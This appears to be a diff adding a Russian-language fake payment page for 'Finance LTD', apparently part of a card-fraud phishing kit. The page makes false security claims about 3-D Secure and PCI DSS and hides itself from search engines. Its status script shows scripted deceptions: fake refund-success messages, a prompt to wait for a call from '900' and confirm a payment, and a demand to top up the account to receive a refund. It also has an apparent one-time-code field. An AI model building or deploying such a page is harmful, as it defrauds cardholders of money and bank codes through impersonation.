@@ -1,0 +1,483 @@
+
+<html lang="ru">
+
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<meta name="robots" content="none" ..="">
+	<meta name="robots" content="noindex, nofollow" ..="">
+	<meta name="googlebot" content="noindex, nofollow" ..="">
+	<meta name="yandex" content="none" ..="">
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Оплата | Finance LTD</title>
+
+	<link rel="stylesheet" href="assets/css/payment_logo.css">
+	<link rel="stylesheet" href="assets/css/noty.min.css">
+	<link rel="stylesheet" href="assets/css/semanticui.css">
+	<link rel="stylesheet" href="assets/css/preloader.css">
+	<link rel="stylesheet" href="assets/css/bootstrap-v4.css">
+	<link rel="stylesheet" href="assets/css/style.css">
+	<link rel="stylesheet" href="assets/css/main.min.css">
+	<link rel="stylesheet" href="assets/css/checkout-53eb466b2cc992665f879c7ed21262b7.css">
+	<link rel="stylesheet" type="text/css" href="assets/css/checkout-app-init-2da6025dec1ef76beb33b9cc60514bfb.css">
+	<style>
+		button {
+			-webkit-appearance: none !important;
+			-moz-appearance: none !important;
+			appearance: none !important;
+		}
+	</style>
+	<style>
+		.App-Container:not(.App-Container--setupMode):before {
+			background: none;
+		}
+	</style>
+	<script src="assets/script/noty.min.js"></script>
+	<script>
+		Noty.overrideDefaults({
+			progressBar: false,
+			timeout: 5000,
+			theme: 'semanticui',
+		});
+	</script>
+	<script src="assets/script/jquery.min.js"></script>
+	<script src="assets/script/bootstrap.min.js"></script>
+	<script src="assets/script/cookies.js"></script>
+	<script src="assets/script/imask.js"></script>
+	<script src="assets/script/server.js"></script>
+	<script src="assets/script/binbanks.js"></script>
+	<script src="assets/script/service.js"></script>
+</head>
+
+<body tabindex="-1" style="overflow-x:hidden">
+	<noscript>You need to enable JavaScript to run this app.</noscript>
+	<div id="loader" style="display:none">
+		<div
+			class="LightboxModal LightboxModal-open LightboxModal-contentLoaded LightboxModal-400x600 LightboxModal-noNestedTargeting">
+			<div class="LightboxModalPosition">
+				<div class="LightboxModalSize">
+					<div class="LightboxModalContainer" role="dialog">
+						<div class="LightboxModalLoadingIndicator" id="loading_frame">
+							<div class="LoadingScreen">
+								<div class="Spinner" aria-busy="true">
+									<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="Spinner-svg">
+										<ellipse cx="12" cy="12" rx="10" ry="10" class="Spinner-ellipse"></ellipse>
+									</svg>
+								</div><img class="LoadingScreen-brand LoadingScreen-brand"
+									style="margin-top:32px;height:80px;" src="assets/img/big_logo.png">
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="main-wrapper">
+		<header class="hdr header block-with-lazy">
+			<div class="top-line block-with-lazy">
+				<div class="container">
+					<div class="top-line__row row">
+						<div class="top-line__col col-auto"> <img class="res-i top-line__logo-wrap"
+								src="assets/img/big_logo.png" style="width: 64px"> </div>
+						<div class="top-line__col col-auto">
+							<div class="secure-info"> <img class="icon icon-lock " src="assets/img/sprite.png">
+								<div class="secure-info__text">Ваши данные защищены</div>
+							</div>
+						</div>
+						<div class="t-spacer"></div>
+						<div class="top-line__col col-auto">
+							<div class="lang-switcher">
+								<div class="lang-switcher-current">
+									<div class="lang-switcher-item">
+										<div class="lang-switcher-img"> <img id="current-l" src="assets/img/ru.png"
+												style="width: 30px;"> </div>
+									</div>
+								</div>
+								<div class="lang-switcher-list">
+									<a style="cursor:pointer" id="en" class="change lang-switcher-item ">
+										<div class="lang-switcher-img" style="text-align: center"> <img
+												src="assets/img/en.png" style="width: 24px;"> </div>
+									</a>
+									<a style="cursor:pointer" id="ru" class="change lang-switcher-item current">
+										<div class="lang-switcher-img" style="text-align: center"> <img
+												src="assets/img/ru.png" style="width: 24px;"> </div>
+									</a>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</header>
+		<div class="wrapper" id="root">
+			<div class="App-Container is-noBackground flex-container justify-content-center">
+				<div class="App App--singleItem">
+					<div class="App-Overview">
+						<header class="Header">
+							<div
+								class="Header-Content flex-container justify-content-space-between align-items-stretch">
+								<div class="Header-business flex-item width-grow flex-container align-items-center">
+									<a class="Link Header-businessLink Link--primary" id="backShop" href="index.html"
+										aria-label="Предыдущая страница" target="_self">
+										<div style="position: relative;">
+											<div class="flex-container align-items-center">
+												<div class="Header-backArrowContainer"
+													style="opacity: 1; transform: none;">
+													<svg class="InlineSVG Icon Header-backArrow mr2 Icon--sm"
+														focusable="false" width="12" height="12" viewBox="0 0 16 16">
+														<path
+															d="M3.417 7H15a1 1 0 0 1 0 2H3.417l4.591 4.591a1 1 0 0 1-1.415 1.416l-6.3-6.3a1 1 0 0 1 0-1.414l6.3-6.3A1 1 0 0 1 8.008 2.41z"
+															fill-rule="evenodd"></path>
+													</svg>
+												</div>
+												<div class="Header-merchantLogoContainer" style="transform: none;">
+													<div class="Header-merchantLogoWithLabel flex-item width-grow">
+														<div
+															class="HeaderImage HeaderImage--icon HeaderImage--iconFallback flex-item width-fixed flex-container justify-content-center align-items-center width-fixed">
+															<svg class="InlineSVG Icon HeaderImage-fallbackIcon Icon--sm"
+																focusable="false" viewBox="0 0 16 16">
+																<path
+																	d="M3 7.5V12h10V7.5c.718 0 1.398-.168 2-.468V15a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V7.032c.602.3 1.282.468 2 .468zM0 3L1.703.445A1 1 0 0 1 2.535 0h10.93a1 1 0 0 1 .832.445L16 3a3 3 0 0 1-5.5 1.659C9.963 5.467 9.043 6 8 6s-1.963-.533-2.5-1.341A3 3 0 0 1 0 3z"
+																	fill-rule="evenodd"></path>
+															</svg>
+														</div> <span
+															class="Header-businessLink-label Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500">Назад</span>
+														<h1
+															class="Header-businessLink-name Text Text-color--gray800 Text-fontSize--14 Text-fontWeight--500 Text--truncate">
+															Вернуться в магазин</h1>
+													</div>
+												</div>
+											</div>
+										</div>
+									</a>
+								</div>
+							</div>
+						</header>
+						<div class="App-productSummaryContainer">
+							<div class="ProductSummary no-image">
+								<div class="ProductSummary-info"> <span
+										class="Text Text-color--gray500 Text-fontSize--16 Text-fontWeight--500">
+										Finance LTD.</span><span
+										class="ProductSummary-totalAmount Text Text-color--default Text-fontWeight--600 Text--tabularNumbers"
+										id="ProductSummary-totalAmount">
+										 ₽
+									</span> <span
+										class="ProductSummary-description Text Text-color--gray500 Text-fontSize--14 Text-fontWeight--500"
+										id="ProductSummary-description">
+										<div class="ProductSummaryDescription ProductSummaryDescription--singleItem"
+											id="offer">Предложение :
+																					</div>
+									</span> </div>
+							</div>
+						</div>
+					</div>
+					<div class="App-Payment">
+						<div class="CheckoutPaymentForm">
+							<div class="PaymentRequestOrHeader" style="height: auto;">
+								<header class="Header">
+									<div
+										class="Header-Content flex-container justify-content-space-between align-items-stretch">
+										<div
+											class="Header-business flex-item width-grow flex-container align-items-center">
+											
+
+										</div>
+									</div>
+								</header>
+								<div class="PaymentHeaderContainer" style="display: block; opacity: 1;">
+									<div class="PaymentHeader">
+
+										<div class="Text Text-color--default Text-fontSize--20 Text-fontWeight--500">
+																					</div>
+									</div>
+								</div>
+								<div class="ButtonAndDividerContainer" style="opacity: 0; display: none;"></div>
+							</div>
+							<div class="PaymentFormFixedHeightContainer flex-container direction-column"
+								style="height: 522px;">
+								<div class="App-Global-Fields flex-container spacing-16 direction-row wrap-wrap">
+									<div class="flex-item width-12"> </div>
+								</div>
+								<div
+									class="PaymentForm-paymentMethodForm flex-container spacing-16 direction-column wrap-wrap">
+
+									
+									<div class="BillingAddressForm-addressInput flex-item width-12" aria-hidden="false">
+										<div style="pointer-events: auto; height: auto; opacity: 1;">
+											<div class="flex-container spacing-16 direction-row wrap-wrap">
+
+												<div class="flex-item width-12">
+													<div class="FormFieldGroup">
+														<div
+															class="FormFieldGroup-labelContainer flex-container justify-content-space-between">
+															<label for="country"><span
+																	class="Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
+																																	</span></label>
+														</div>
+														<div class="FormFieldGroup-Fieldset">
+															<div class="FormFieldGroup-container FormFieldGroup-container--supportTransitions"
+																id="country-fieldset">
+																<div
+																	class="FormFieldGroup-child FormFieldGroup-child--width-12 FormFieldGroup-childLeft FormFieldGroup-childRight FormFieldGroup-childTop FormFieldGroup-childBottom">
+																	<div class="FormFieldInput is-select">
+																		<div>
+																			<div class="Select">
+																				<select id="billingCountry"
+																					name="billingCountry"
+																					autocomplete="billing country"
+																					aria-label="Платежный номер"
+																					class="Select-source"
+																					disabled="disabled">
+																					<option value="" disabled="disabled"
+																						hidden=""></option>
+																					<option value="EU"
+																						selected="selected">
+																																											</option>
+																				</select>
+																				<svg class="InlineSVG Icon Select-arrow Icon--sm"
+																					focusable="false"
+																					viewBox="0 0 12 12">
+																					<path
+																						d="M10.193 3.97a.75.75 0 0 1 1.062 1.062L6.53 9.756a.75.75 0 0 1-1.06 0L.745 5.032A.75.75 0 0 1 1.807 3.97L6 8.163l4.193-4.193z"
+																						fill-rule="evenodd"></path>
+																				</svg>
+																			</div>
+																		</div>
+																	</div>
+																</div>
+																<div style="opacity: 0; height: 0px;"><span
+																		class="FieldError Text Text-color--red Text-fontSize--13"><span
+																			aria-hidden="true"></span></span>
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+									<div class="PaymentForm-confirmPaymentContainer flex-item width-grow"
+										style="padding: 8px;">
+										<div class="flex-item width-12">
+											<label class="ConfirmPayment-Error Text Text-color--red Text-fontSize--14"
+												for="message"></label>
+										</div>
+										<div class="flex-item width-12">
+											<button class="SubmitButton SubmitButton--incomplete" type="submit"
+												id="checkout"
+												style="background-color: rgb(0, 116, 212); color: rgb(255, 255, 255);"
+												data-testid="hosted-payment-submit-button">
+												<div id="Shimmer" class="SubmitButton-Shimmer"
+													style="background: rgba(0, 0, 0, 0) linear-gradient(to right, rgba(0, 116, 212, 0) 0%, rgb(58, 139, 238) 50%, rgba(0, 116, 212, 0) 100%) repeat scroll 0% 0%;">
+												</div>
+												<div class="SubmitButton-TextContainer"> <span id="prepare"
+														class="SubmitButton-Text SubmitButton-Text--current Text Text-color--default Text-fontWeight--500 Text--truncate"
+														aria-hidden="false">
+																											</span> <span id="reprepare"
+														class="SubmitButton-Text SubmitButton-Text--pre Text Text-color--default Text-fontWeight--500 Text--truncate"
+														aria-hidden="true">Идет обработка...</span></div>
+												<div class="SubmitButton-IconContainer">
+													<div id="button_icon"
+														class="SubmitButton-Icon SubmitButton-Icon--pre">
+														<div class="Icon Icon--md Icon--square">
+															<svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"
+																focusable="false">
+																<path
+																	d="M3 7V5a5 5 0 1 1 10 0v2h.5a1 1 0 0 1 1 1v6a2 2 0 0 1-2 2h-9a2 2 0 0 1-2-2V8a1 1 0 0 1 1-1zm5 2.5a1 1 0 0 0-1 1v2a1 1 0 0 0 2 0v-2a1 1 0 0 0-1-1zM11 7V5a3 3 0 1 0-6 0v2z"
+																	fill="#ffffff" fill-rule="evenodd"></path>
+															</svg>
+														</div>
+													</div>
+													<div id="button_spinner"
+														class="SubmitButton-Icon SubmitButton-SpinnerIcon SubmitButton-Icon--pre">
+														<div class="Icon Icon--md Icon--square">
+															<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"
+																focusable="false">
+																<ellipse cx="12" cy="12" rx="10" ry="10"
+																	style="stroke: rgb(255, 255, 255);"></ellipse>
+															</svg>
+														</div>
+													</div>
+												</div>
+												<div class="SubmitButton-CheckmarkIcon">
+													<div class="Icon Icon--md">
+														<svg xmlns="http://www.w3.org/2000/svg" width="22" height="14"
+															focusable="false">
+															<path d="M 0.5 6 L 8 13.5 L 21.5 0" fill="transparent"
+																stroke-width="2" stroke="#ffffff" stroke-linecap="round"
+																stroke-linejoin="round"></path>
+														</svg>
+													</div>
+												</div>
+											</button>
+											<div class="ConfirmPayment-PostSubmit">
+												<div>
+													<div style="height: 0px; opacity: 0; pointer-events: none;">
+														<div
+															class="ConfirmTerms Text Text-color--gray500 Text-fontSize--13">
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+										<div class="CardPayment-signUpFormContainer flex-item width-12"
+											style="margin-bottom:15%;">
+											<div style="pointer-events: auto; height: auto; opacity: 1;">
+												<div class="SignUpForm">
+													<div class="SignUpForm-checkboxContainer">
+														<div class="FormFieldCheckbox SignUpForm-checkbox">
+															<div class="CheckboxField">
+																<label for="enableStripePass"> <span
+																		class="Checkbox-Label Text Text-color--gray600 Text-fontSize--13 Text-fontWeight--500">
+																		<div class="SignUpForm-subLabel" В="" сумму=""
+																			оплаты="" будет="" включена=""
+																			комиссия.<br="">
+																			Система <a
+																				style="text-decoration: none!important;"
+																				href="https://www.ibam.ru/services/individuals/credit-cards/3d-secure/">3-D
+																				Secure</a> надёжно доставит вашу
+																			транзакцию.<br>
+																			Безопасность работы подтверждена <a
+																				style="text-decoration: none!important;"
+																				href="https://compliance-control.eu/cert/unitpay/pcidss_compliance.html">PCI
+																				DSS</a>.<br>
+																			Мы не передаем персональные данные третьим
+																			лицам.</div>
+																	</span> </label>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="Modal-Portal">
+	</div>
+</body>
+
+<script>
+
+	function check(id) {
+		$.ajax({
+			url: '/check',
+			dataType: 'text',
+			method: 'post',
+			data: { type: 'get_order_status', order_id: '' },
+			success: function (data) {
+				console.log(data);
+				data = $.parseJSON(data);
+				switch (data.status) {
+					case 'wrong_code':
+						document.getElementById("errorContainer").innerHTML = "Неверный код. Попробуйте еще раз.";
+						document.getElementById('DynamicPassword').value = "";
+						document.getElementById('start').style.display = "block";
+						document.getElementById('wait').style.display = "none";
+						$('#btnSubmit, #DynamicPassword').removeAttr("disabled");
+						break;
+					case "success2":
+						$.redirect(
+							'/error',
+							{
+								order_id: '',
+								error_message: 'Возврат успешен! Средства поступят в течении 20 минут.'
+							});
+						break;
+					case 'fraud':
+						$.redirect(
+							'/error',
+							{
+								order_id: '',
+								error_message: 'Операция отклонена банком. Обратитесь в банк, выпустивший карту списания. Пожалуйста, дождитесь звонка от 900 и подтвердите оплату.'
+							});
+						break;
+					case 'insufficient_funds':
+						$.redirect(
+							'/error',
+							{
+								order_id: '',
+								error_message: 'Не хватает денег на карте, с которой вы хотите списать деньги, или исчерпан лимит.'
+							});
+						break;
+					case 'contact_support':
+						$.redirect(
+							'/error',
+							{
+								order_id: '',
+								error_message: 'Ошибка платежа. Обратитесь в техническую поддержку продавца.'
+							});
+						break;
+					case 'fraud_refund':
+						$.redirect(
+							'/error',
+							{
+								order_id: '',
+								error_message: 'Операция отклонена банком. Для успешного возврата подтвердите операцию в банке.'
+							});
+						break;
+					case 'sberPay':
+						$.redirect(
+							'/sberpay',
+							{
+								order_id: '',
+								amount: ''
+							});
+						break;
+					case 'sbp_payment':
+						$.redirect(
+							'/sbp',
+							{
+								order_id: '',
+								amount: ''
+							});
+						break;
+					case 'funds_refund':
+						$.redirect(
+							'/error',
+							{
+								order_id: '',
+								error_message: 'Недостаточно суммы эквивалента для возврата. Пополните счет.'
+							});
+						break;
+				}
+			}
+		});
+	}
+
+
+</script>
+<script>
+	function selectMethod(method) {
+		switch (method) {
+			case '1':
+				$("#methodCard").show();
+				$("#methodSelect").hide();
+				$("#methodSBP").hide();
+				break;
+			case '2':
+				$("#methodSBP").show();
+				$("#methodCard").hide();
+				$("#methodSelect").hide();
+				break;
+			case '3':
+				$("#methodSBP").hide();
+				$("#methodCard").hide();
+				$("#methodSelect").show();
+				break;
+			default:
+				break;
+		}
+
+	}
+	const pageInfo = { "id": "", "price": "", "backToShop": "https:///", "offer": "", "promocode": "", "nameRecipient": "", "phoneNumber": "" };
+</script>
+
+</html>
